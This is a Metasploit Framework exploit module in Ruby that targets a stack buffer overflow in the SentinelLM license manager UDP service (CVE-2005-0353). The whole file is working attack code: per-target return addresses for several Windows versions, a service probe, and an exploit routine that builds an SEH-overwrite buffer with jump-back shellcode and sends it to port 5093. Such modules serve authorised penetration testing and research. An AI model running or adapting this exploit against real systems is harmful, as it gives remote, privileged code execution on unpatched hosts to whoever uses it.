##
# $Id: sentinel_lm7_udp.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SentinelLM UDP Buffer Overflow',
			'Description'    => %q{
					This module exploits a simple stack buffer overflow in the Sentinel
				License Manager. The SentinelLM service is installed with a
				wide selection of products and seems particular popular with
				academic products. If the wrong target value is selected,
				the service will crash and not restart.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0353'],
					[ 'OSVDB', '14605'],
					[ 'BID', '12742'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['SentinelLM 7.2.0.0 Windows NT 4.0 SP4/SP5/SP6', { 'Ret' => 0x77681799 }], # ws2help.dll
					['SentinelLM 7.2.0.0 Windows 2000 English',       { 'Ret' => 0x75022ac4 }], # ws2help.dll
					['SentinelLM 7.2.0.0 Windows 2000 German',        { 'Ret' => 0x74fa1887 }], # ws2help.dll
					['SentinelLM 7.2.0.0 Windows XP English SP0/SP1', { 'Ret' => 0x71aa32ad }], # ws2help.dll
					['SentinelLM 7.2.0.0 Windows 2003 English SP0',   { 'Ret' => 0x7ffc0638 }], # peb
				],
			'DisclosureDate' => 'Mar 07 2005' ))

		register_options(
			[
				Opt::RPORT(5093)
			], self.class)
	end

	def check
		connect_udp
		udp_sock.put("\x7a\x00\x00\x00\x00\x00")
		res = udp_sock.recvfrom(8192)
		disconnect_udp

		if (res and res[0] == 0x7a)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_udp

		# Payload goes first
		buf = payload.encoded + rand_text_english(2048-payload.encoded.length)

		# Return to a pop/pop/ret via SEH
		buf[836, 4] = [target.ret].pack('V')

		# The pop/pop/ret takes us here, jump back 5 bytes
		buf[832, 2] = "\xeb\xf9"

		# Now jump all the way back to our shellcode
		buf[827, 5] = "\xe9" + [-829].pack('V')

		udp_sock.put(buf)
		udp_sock.recvfrom(8192)

		handler
		disconnect_udp
	end


end